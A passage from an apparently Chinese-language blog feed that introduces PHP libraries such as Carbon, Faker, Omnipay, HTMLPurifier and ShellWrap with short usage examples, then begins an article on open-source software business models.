class="variable">$memo</span>, <span class="variable">$num</span></span>) </span>&#123; <span class="keyword">return</span> <span class="variable">$memo</span> + <span class="variable">$num</span>; &#125;, <span class="number">0</span>); <span class="comment">// 6</span></span><br><span class="line"></span><br><span class="line">__::<span class="title function_ invoke__">find</span>(<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>), <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$num</span></span>) </span>&#123; <span class="keyword">return</span> <span class="variable">$num</span> % <span class="number">2</span> === <span class="number">0</span>; &#125;); <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">__::<span class="title function_ invoke__">filter</span>(<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>), <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$num</span></span>) </span>&#123; <span class="keyword">return</span> <span class="variable">$num</span> % <span class="number">2</span> === <span class="number">0</span>; &#125;); <span class="comment">// array(2, 4)</span></span><br></pre></td></tr></table></figure>

<p>这个库也支持链式语法，这使得它更为强大</p>
<h2 id="9-Requests-–-简单-HTTP-请求"><a href="#9-Requests-–-简单-HTTP-请求" class="headerlink" title="9. Requests – 简单 HTTP 请求"></a>9. Requests – 简单 HTTP 请求</h2><p>Requests 是一个简化 HTTP 请求的库。</p>
<p>如果你和我一样，几乎从来都记不住传递给 Curl 的各种各样的参数，那么它就是为你准备的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(<span class="string">&#x27;Accept&#x27;</span> =&gt; <span class="string">&#x27;application/json&#x27;</span>);</span><br><span class="line"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="string">&#x27;auth&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>));</span><br><span class="line"><span class="variable">$request</span> = <span class="title class_">Requests</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;https://api.github.com/gists&#x27;</span>, <span class="variable">$headers</span>, <span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$request</span>-&gt;status_code);</span><br><span class="line"><span class="comment">// int(200)</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$request</span>-&gt;headers[<span class="string">&#x27;content-type&#x27;</span>]);</span><br><span class="line"><span class="comment">// string(31) &quot;application/json; charset=utf-8&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$request</span>-&gt;body);</span><br><span class="line"><span class="comment">// string(26891) &quot;[…]&quot;</span></span><br></pre></td></tr></table></figure>

<p>借助这个库，你可以发送 HEAD、GET、POST、PUT、DELTE 和 PATCH HTTP 请求，你可以通过数组添加文件和参数，并且可以访问所有相应数据。</p>
<h2 id="10-Buzz-–-简单的-HTTP-请求库"><a href="#10-Buzz-–-简单的-HTTP-请求库" class="headerlink" title="10. Buzz – 简单的 HTTP 请求库"></a>10. Buzz – 简单的 HTTP 请求库</h2><p>Buzz 是另一个完成 HTTP 请求的库。下面是一个例子</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="variable">$request</span> = <span class="keyword">new</span> <span class="type">Buzz</span>\Message\Request(<span class="string">&#x27;HEAD&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;http://google.com&#x27;</span>);</span><br><span class="line"><span class="variable">$response</span> = <span class="keyword">new</span> <span class="type">Buzz</span>\Message\Response();</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="type">Buzz</span>\Client\FileGetContents();</span><br><span class="line"><span class="variable">$client</span>-&gt;send(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br><span class="line"></span><br><span class="line">echo <span class="variable">$request</span>;</span><br><span class="line">echo <span class="variable">$response</span></span><br></pre></td></tr></table></figure>

<p>因为它缺乏文档，所以你不得不阅读源码来获知它支持的所有参数。</p>
<h2 id="11-Goutte-–-Web-抓取库"><a href="#11-Goutte-–-Web-抓取库" class="headerlink" title="11. Goutte – Web 抓取库"></a>11. Goutte – Web 抓取库</h2><p>Goutte 是一个抓取网站和提取数据的库。它提供了一个优雅的 API，这使得从远程页面上选择特定元素变得简单。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;/path/to/goutte.phar&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Goutte</span>\<span class="title">Client</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">Client</span>();</span><br><span class="line"><span class="variable">$crawler</span> = <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://www.symfony-project.org/&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//点击链接</span></span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$crawler</span>-&gt;<span class="title function_ invoke__">selectLink</span>(<span class="string">&#x27;Plugins&#x27;</span>)-&gt;<span class="title function_ invoke__">link</span>();</span><br><span class="line"><span class="variable">$crawler</span> = <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">click</span>(<span class="variable">$link</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//使用一个类CSS语法提取数据</span></span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$crawler</span>-&gt;<span class="title function_ invoke__">filter</span>(<span class="string">&#x27;#data&#x27;</span>)-&gt;<span class="title function_ invoke__">text</span>(); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Here is the text: <span class="subst">$t</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="12-Carbon-–-DateTime-库"><a href="#12-Carbon-–-DateTime-库" class="headerlink" title="12. Carbon – DateTime 库"></a>12. Carbon – DateTime 库</h2><p>Carbon 是 DateTime API 的一个简单扩展。</p>
<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line">printf(<span class="string">&quot;Right now is %s&quot;</span>, Carbon::now()-&gt;toDateTimeString());</span><br><span class="line">printf(<span class="string">&quot;Right now in Vancouver is %s&quot;</span>, Carbon::now(<span class="string">&#x27;America/Vancouver&#x27;</span>));</span><br><span class="line"></span><br><span class="line">$tomorrow = Carbon::now()-&gt;addDay();</span><br><span class="line">$lastWeek = Carbon::now()-&gt;subWeek();</span><br><span class="line">$nextSummerOlympics = Carbon::createFromDate(<span class="number">2012</span>)-&gt;addYears(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">$officialDate = Carbon::now()-&gt;toRFC2822String();</span><br><span class="line"></span><br><span class="line">$howOldAmI = Carbon::createFromDate(<span class="number">1975</span>, <span class="number">5</span>, <span class="number">21</span>)-&gt;age;</span><br><span class="line"></span><br><span class="line">$noonTodayLondonTime = Carbon::createFromTime(<span class="number">12</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&#x27;Europe/London&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$endOfWorld = Carbon::createFromDate(<span class="number">2012</span>, <span class="number">12</span>, <span class="number">21</span>, <span class="string">&#x27;GMT&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//总是以UTC对比</span></span><br><span class="line"><span class="keyword">if</span> (Carbon::now()-&gt;gte($endOfWorld)) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Carbon::now()-&gt;isWeekend()) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Party!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> Carbon::now()-&gt;subMinutes(<span class="number">2</span>)-&gt;diffForHumans(); <span class="comment">// &#x27;2分钟之前&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="13-Ubench-–-微型基准库"><a href="#13-Ubench-–-微型基准库" class="headerlink" title="13. Ubench – 微型基准库"></a>13. Ubench – 微型基准库</h2><p>Ubench 是一个用于评测 PHP 代码的微型库，可监控（代码）执行时间和内存使用率。下面是范例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">Ubench</span>\<span class="title">Ubench</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$bench</span> = <span class="keyword">new</span> <span class="title class_">Ubench</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$bench</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行一些代码</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$bench</span>-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取执行消耗时间和内存</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$bench</span>-&gt;<span class="title function_ invoke__">getTime</span>(); <span class="comment">// 156ms or 1.123s</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$bench</span>-&gt;<span class="title function_ invoke__">getTime</span>(<span class="literal">true</span>); <span class="comment">// elapsed microtime in float</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$bench</span>-&gt;<span class="title function_ invoke__">getTime</span>(<span class="literal">false</span>, <span class="string">&#x27;%d%s&#x27;</span>); <span class="comment">// 156ms or 1s</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$bench</span>-&gt;<span class="title function_ invoke__">getMemoryPeak</span>(); <span class="comment">// 152B or 90.00Kb or 15.23Mb</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$bench</span>-&gt;<span class="title function_ invoke__">getMemoryPeak</span>(<span class="literal">true</span>); <span class="comment">// memory peak in bytes 内存峰值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$bench</span>-&gt;<span class="title function_ invoke__">getMemoryPeak</span>(<span class="literal">false</span>, <span class="string">&#x27;%.3f%s&#x27;</span>); <span class="comment">// 152B or 90.152Kb or 15.234Mb</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在结束标识处返回内存使用情况</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$bench</span>-&gt;<span class="title function_ invoke__">getMemoryUsage</span>(); <span class="comment">// 152B or 90.00Kb or 15.23Mb</span></span><br></pre></td></tr></table></figure>

<p>(仅) 在开发时运行这些校验是一个好主意。</p>
<h2 id="14-Validation-–-输入验证引擎"><a href="#14-Validation-–-输入验证引擎" class="headerlink" title="14. Validation – 输入验证引擎"></a>14. Validation – 输入验证引擎</h2><p>Validation 声称是 PHP 库里最强大的验证引擎。但是，它能名副其实吗？看下面：</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line">use Respect\Validation\Validator <span class="keyword">as</span> v; </span><br><span class="line"></span><br><span class="line"><span class="comment">//简单验证</span></span><br><span class="line">$number = <span class="number">123</span>;</span><br><span class="line"><span class="function"><span class="title">v</span>::numeric()-&gt;</span>validate($number); <span class="comment">//true </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//链式验证</span></span><br><span class="line">$<span class="function"><span class="title">usernameValidator</span> = v::alnum()-&gt;</span><span class="function"><span class="title">noWhitespace</span>()-&gt;</span>length(<span class="number">1</span>,<span class="number">15</span>);</span><br><span class="line">$<span class="function"><span class="title">usernameValidator</span>-&gt;</span>validate(<span class="string">&#x27;alganet&#x27;</span>); <span class="comment">//true </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//验证对象属性</span></span><br><span class="line">$user = new stdClass;</span><br><span class="line">$<span class="function"><span class="title">user</span>-&gt;</span><span class="keyword">name</span> = <span class="string">&#x27;Alexandre&#x27;</span>;</span><br><span class="line">$<span class="function"><span class="title">user</span>-&gt;</span>birthdate = <span class="string">&#x27;1987-07-01&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">//在一个简单链中验证他的属性</span></span><br><span class="line">$<span class="function"><span class="title">userValidator</span> = v::attribute(&#x27;<span class="keyword">name</span>&#x27;, v::string()-&gt;</span>length(<span class="number">1</span>,<span class="number">32</span>))</span><br><span class="line">                  -&gt;<span class="function"><span class="title">attribute</span>(&#x27;birthdate&#x27;, v::date()-&gt;</span>minimumAge(<span class="number">18</span>)); </span><br><span class="line"></span><br><span class="line">$<span class="function"><span class="title">userValidator</span>-&gt;</span>validate($user); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>你可以通过这个库验证你的表单或其他用户提交的数据。除此之外，它内置了很多校验，抛出异常和定制错误信息。</p>
<h2 id="15-Filterus-–-过滤库"><a href="#15-Filterus-–-过滤库" class="headerlink" title="15. Filterus – 过滤库"></a>15. Filterus – 过滤库</h2><p>Filterus 是另一个过滤库，但它不仅仅可以验证，也可以过滤匹配预设模式的输出。下面是一个例子：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="variable">$f</span> = <span class="title class_">Filter</span><span class="symbol">:</span><span class="symbol">:factory</span>(<span class="string">&#x27;string,max:5&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;This is a test string&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span>-&gt;validate(<span class="variable">$str</span>); <span class="regexp">//</span> <span class="literal">false</span></span><br><span class="line"><span class="variable">$f</span>-&gt;filter(<span class="variable">$str</span>); <span class="regexp">//</span> <span class="string">&#x27;This &#x27;</span></span><br></pre></td></tr></table></figure>

<p>Filterus 有很多内建模式，支持链式用法，甚至可以用独立的验证规则去验证数组元素。</p>
<h2 id="16-Faker-–-假数据生成器"><a href="#16-Faker-–-假数据生成器" class="headerlink" title="16. Faker – 假数据生成器"></a>16. Faker – 假数据生成器</h2><p>Faker 是一个为你生成假数据的 PHP 库。</p>
<p>当你需要填充一个测试数据库，或为你的 web 应用生成测试数据时，它能派上用场。它也非常容易使用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引用Faker 自动加载器</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;/path/to/Faker/src/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用工厂创建来创建一个Faker\Generator实例</span></span><br><span class="line"><span class="variable">$faker</span> = <span class="title class_">Faker\Factory</span>::<span class="title function_ invoke__">create</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过访问属性生成假数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$faker</span>-&gt;name; <span class="comment">// &#x27;Lucy Cechtelar&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$faker</span>-&gt;address;</span><br><span class="line">  <span class="comment">// &quot;426 Jordy Lodge</span></span><br><span class="line">  <span class="comment">// Cartwrightshire, SC 88120-6700&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$faker</span>-&gt;text;</span><br><span class="line">  <span class="comment">// Sint velit eveniet. Rerum atque repellat voluptatem quia ...</span></span><br></pre></td></tr></table></figure>

<p>只要你继续访问对象属性，它将继续返回随机生成的数据。 </p>
<h2 id="17-Mustache-php-–-优雅模板库"><a href="#17-Mustache-php-–-优雅模板库" class="headerlink" title="17. Mustache.php – 优雅模板库"></a>17. Mustache.php – 优雅模板库</h2><p>Mustache 是一款流行的模板语言，实际已经在各种编程语言中得到实现。使用它，你可以在客户端或服务段重用模板。 </p>
<p>正如你猜得那样，Mustache.php 是使用 PHP 实现的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> <span class="title class_">Mustache_Engine</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$m</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;Hello &#123;&#123;planet&#125;&#125;&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;planet&#x27;</span> =&gt; <span class="string">&#x27;World!&#x27;</span>)); <span class="comment">// &quot;Hello World!&quot;</span></span><br></pre></td></tr></table></figure>

<p>建议看一下官方网站 Mustache docs 查看更多高级的例子。 </p>
<h2 id="18-Gaufrette-–-文件系统抽象层"><a href="#18-Gaufrette-–-文件系统抽象层" class="headerlink" title="18. Gaufrette – 文件系统抽象层"></a>18. Gaufrette – 文件系统抽象层</h2><p>Gaufrette 是一个 PHP5 库，提供了一个文件系统的抽象层。它使得以相同方式操控本地文件，FTP 服务器，亚马逊 S3 或更多操作变为可能。</p>
<p>它允许你开发程序时，不用了解未来你将怎么访问你的文件</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> Gaufrette\Filesystem;</span><br><span class="line"><span class="keyword">use</span> Gaufrette\Adapter\Ftp as FtpAdapter;</span><br><span class="line"><span class="keyword">use</span> Gaufrette\Adapter\Local as LocalAdapter; </span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>本地文件:</span><br><span class="line">$adapter = new LocalAdapter(<span class="string">&#x27;/var/media&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>可选地使用一个FTP适配器</span><br><span class="line">// $ftp = new FtpAdapter($path, $host, $username, $password, $port); </span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>初始化文件系统</span><br><span class="line">$filesystem = new Filesystem($adapter); </span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>使用它</span><br><span class="line">$content = $filesystem-&gt;<span class="keyword">read</span>(<span class="string">&#x27;myFile&#x27;</span>);</span><br><span class="line">$content = <span class="string">&#x27;Hello I am the new content&#x27;</span>;</span><br><span class="line">$filesystem-&gt;<span class="keyword">write</span>(<span class="string">&#x27;myFile&#x27;</span>, $content);</span><br></pre></td></tr></table></figure>

<p>也有缓存和内存适配器，并且随后将会增加更多适配器。</p>
<h2 id="19-Omnipay-–-支付处理库"><a href="#19-Omnipay-–-支付处理库" class="headerlink" title="19. Omnipay – 支付处理库"></a>19. Omnipay – 支付处理库</h2><p>Omnipay 是一个 PHP 支付处理库。它有一个清晰一致的 API，并且支持数十个网关。</p>
<p>使用这个库，你仅仅需要学习一个 API 和处理各种各样的支付处理器。下面是一个例子：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">use Omnipay\CreditCard;</span><br><span class="line">use Omnipay\GatewayFactory;</span><br><span class="line"></span><br><span class="line"><span class="variable">$gateway</span> = GatewayFactory::create(<span class="string">&#x27;Stripe&#x27;</span>);</span><br><span class="line"><span class="variable">$gateway</span>-&gt;setApiKey(<span class="string">&#x27;abc123&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$formData</span> = [<span class="string">&#x27;number&#x27;</span> =&gt; <span class="string">&#x27;4111111111111111&#x27;</span>, <span class="string">&#x27;expiryMonth&#x27;</span> =&gt; <span class="number">6</span>, <span class="string">&#x27;expiryYear&#x27;</span> =&gt; <span class="number">2016</span>];</span><br><span class="line"><span class="variable">$response</span> = <span class="variable">$gateway</span>-&gt;purchase([<span class="string">&#x27;amount&#x27;</span> =&gt; <span class="number">1000</span>, <span class="string">&#x27;card&#x27;</span> =&gt; <span class="variable">$formData</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$response</span>-&gt;isSuccessful()) &#123;</span><br><span class="line">　　<span class="regexp">//</span>支付成功:更新数据库</span><br><span class="line">    print_r(<span class="variable">$response</span>);</span><br><span class="line">&#125; elseif (<span class="variable">$response</span>-&gt;isRedirect()) &#123;</span><br><span class="line">　　<span class="regexp">//</span>跳转到异地支付网关</span><br><span class="line">    <span class="variable">$response</span>-&gt;redirect();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">　　<span class="regexp">//</span>支付失败:向客户显示信息</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$response</span>-&gt;getMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用相同一致的 API，可以很容易地支持多种支付处理器，或在需要时进行切换。 </p>
<h2 id="20-Upload-–-处理文件上传"><a href="#20-Upload-–-处理文件上传" class="headerlink" title="20. Upload – 处理文件上传"></a>20. Upload – 处理文件上传</h2><p>Upload 是一个简化文件上传和验证的库。上传表单时，这个库会校验文件类型和尺寸。</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="variable">$storage</span> = <span class="keyword">new</span> <span class="type"></span>\Upload\Storage\FileSystem(<span class="string">&#x27;/path/to/directory&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="type"></span>\Upload\File(<span class="string">&#x27;foo&#x27;</span>, <span class="variable">$storage</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//验证文件上传</span></span><br><span class="line"><span class="variable">$file</span>-&gt;addValidations(array(</span><br><span class="line">　　<span class="comment">//确保文件类型是&quot;image/png&quot;</span></span><br><span class="line">    <span class="keyword">new</span> <span class="type"></span>\Upload\Validation\Mimetype(<span class="string">&#x27;image/png&#x27;</span>),</span><br><span class="line"></span><br><span class="line">　　<span class="comment">//确保文件不超过5M(使用&quot;B&quot;,&quot;K&quot;,&quot;M&quot;或者&quot;G&quot;)</span></span><br><span class="line">    <span class="keyword">new</span> <span class="type"></span>\Upload\Validation\Size(<span class="string">&#x27;5M&#x27;</span>)</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="comment">//试图上传文件</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//成功</span></span><br><span class="line">    <span class="variable">$file</span>-&gt;upload();</span><br><span class="line">&#125; <span class="keyword">catch</span> (\Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="comment">//失败!</span></span><br><span class="line">    <span class="variable">$errors</span> = <span class="variable">$file</span>-&gt;getErrors();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它将减少不少乏味的代码。</p>
<h2 id="21-HTMLPurifier-–-HTML-XSS-防护"><a href="#21-HTMLPurifier-–-HTML-XSS-防护" class="headerlink" title="21. HTMLPurifier – HTML XSS 防护"></a>21. HTMLPurifier – HTML XSS 防护</h2><p>HTMLPurifier 是一个 HTML 过滤库，通过强大的白名单和聚集分析，保护你代码远离 XSS 攻击。</p>
<p>它也确保输出标记符合标准。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;/path/to/HTMLPurifier.auto.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$config</span> = <span class="title class_">HTMLPurifier_Config</span>::<span class="title function_ invoke__">createDefault</span>();</span><br><span class="line"><span class="variable">$purifier</span> = <span class="keyword">new</span> <span class="title class_">HTMLPurifier</span>(<span class="variable">$config</span>);</span><br><span class="line"><span class="variable">$clean_html</span> = <span class="variable">$purifier</span>-&gt;<span class="title function_ invoke__">purify</span>(<span class="variable">$dirty_html</span>);</span><br></pre></td></tr></table></figure>

<h2 id="22-ColorJizz-PHP-–-颜色操控库"><a href="#22-ColorJizz-PHP-–-颜色操控库" class="headerlink" title="22. ColorJizz-PHP – 颜色操控库"></a>22. ColorJizz-PHP – 颜色操控库</h2><p>ColorJizz 是一个简单的库，借助它你可以转换不同的颜色格式，并且做简单的颜色运算</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">MischiefCollective</span>\<span class="title">ColorJizz</span>\<span class="title">Formats</span>\<span class="title">Hex</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$red_hex</span> = <span class="keyword">new</span> <span class="title class_">Hex</span>(<span class="number">0xFF0000</span>);</span><br><span class="line"><span class="variable">$red_cmyk</span> = <span class="variable">$hex</span>-&gt;<span class="title function_ invoke__">toCMYK</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$red_cmyk</span>; <span class="comment">// 0,1,1,0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title class_">Hex</span>::<span class="title function_ invoke__">fromString</span>(<span class="string">&#x27;red&#x27;</span>)-&gt;<span class="title function_ invoke__">hue</span>(-<span class="number">20</span>)-&gt;<span class="title function_ invoke__">greyscale</span>(); <span class="comment">// 555555</span></span><br></pre></td></tr></table></figure>

<p>它已经支持并且可以操控所有主流颜色格式了</p>
<h2 id="23-PHP-Geo-–-地理位置定位库"><a href="#23-PHP-Geo-–-地理位置定位库" class="headerlink" title="23. PHP Geo – 地理位置定位库"></a>23. PHP Geo – 地理位置定位库</h2><p>phpgeo 是一个简单的库，用于计算地理坐标之间高精度距离。例如：</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">use Location\Coordinate;</span><br><span class="line">use Location\Distance\Vincenty;</span><br><span class="line"></span><br><span class="line"><span class="variable">$coordinate1</span> = <span class="keyword">new</span> <span class="type">Coordinate</span>(<span class="number">19.820664</span>, <span class="number">-155.468066</span>); <span class="comment">// Mauna Kea Summit 茂纳凯亚峰</span></span><br><span class="line"><span class="variable">$coordinate2</span> = <span class="keyword">new</span> <span class="type">Coordinate</span>(<span class="number">20.709722</span>, <span class="number">-156.253333</span>); <span class="comment">// Haleakala Summit</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$calculator</span> = <span class="keyword">new</span> <span class="type">Vincenty</span>();</span><br><span class="line"><span class="variable">$distance</span> = <span class="variable">$calculator</span>-&gt;getDistance(<span class="variable">$coordinate1</span>, <span class="variable">$coordinate2</span>); <span class="comment">// returns 128130.850 (meters; ≈128 kilometers)</span></span><br></pre></td></tr></table></figure>

<h2 id="24-ShellWrap-–-优美的命令行包装器"><a href="#24-ShellWrap-–-优美的命令行包装器" class="headerlink" title="24. ShellWrap – 优美的命令行包装器"></a>24. ShellWrap – 优美的命令行包装器</h2><p>借助 ShellWrap 库，你可以在 PHP 代码里使用强大的 Linux&#x2F;Unix 命令行工具。</p>
<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;ShellWrap.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title">MrRio</span>\<span class="title">ShellWrap</span> <span class="title">as</span> <span class="title">sh</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">//列出当前文件下的所有文件</span></span><br><span class="line"><span class="keyword">echo</span> sh::ls(); </span><br><span class="line"></span><br><span class="line"><span class="comment">//检出一个git分支</span></span><br><span class="line">sh::git(<span class="string">&#x27;checkout&#x27;</span>, <span class="string">&#x27;master&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//你也可以通过管道把一个命令的输出用户另一个命令</span></span><br><span class="line"><span class="comment">//下面通过curl跟踪位置，然后通过grep过滤’html’管道来下载example.com网站</span></span><br><span class="line"><span class="keyword">echo</span> sh::grep(<span class="string">&#x27;html&#x27;</span>, sh::curl(<span class="string">&#x27;http://example.com&#x27;</span>, <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="keyword">true</span></span><br><span class="line">))); </span><br><span class="line"></span><br><span class="line"><span class="comment">//新建一个文件</span></span><br><span class="line">sh::touch(<span class="string">&#x27;file.html&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//移除文件</span></span><br><span class="line">sh::rm(<span class="string">&#x27;file.html&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//再次移除文件(这次失败了,然后因为文件不存在而抛出异常)</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    sh::rm(<span class="string">&#x27;file.html&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Caught failing sh::rm() call&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当命令行里发生异常时，这个库抛出异常，所以你可以及时对之做出反应。</p>
<p>它也可以通过管道让你一个命令的输出作为另一个命令的输入，来实现更强的灵活性。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>揭密：开源软件七大盈利模式</title>
    <url>/2016/09/open-source/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>开源软件在发展历程中，已经不仅仅是开放源代码的免费软件。开源软件与商业并不冲突，它是一种新兴的商业模式。</p>
<p>与传统的商业软件相比，开源软件采用了开放源代码、免费分发等形式，减少了营销与销售成本，更易于广泛传播。</p>
<span id="more"></span> 

<p>在开源软件领域中，常见的盈利模式一共有 7 种。下面让我们来逐一列举和分析。</p>
<h2 id="盈利模式之一：多种产品线"><a href="#盈利模式之一：多种产品线" class="headerlink" title="盈利模式之一：多种产品线"></a>盈利模式之一：多种产品线</h2><p>如 MySQL 产品就同时推出面向个人和企业的两种版本，即开源版本和专业版本，分别采用不同的授权方式。</p>
<p>开源版本完全免费以便更好的推广，而从专业版的许可销售和支持服务获得收入。</p>
<h2 id="盈利模式之二：技术服务型"><a href="#盈利模式之二：技术服务型" class="headerlink" title="盈利模式之二：技术服务型"></a>盈利模式之二：技术服务型</h2><p>JBoss 就是这种模式的典型代表。JBoss 应用服务器完全免费，而通过提供技术文档、培训、二次开发支持等技术服务而获得收入。</p>
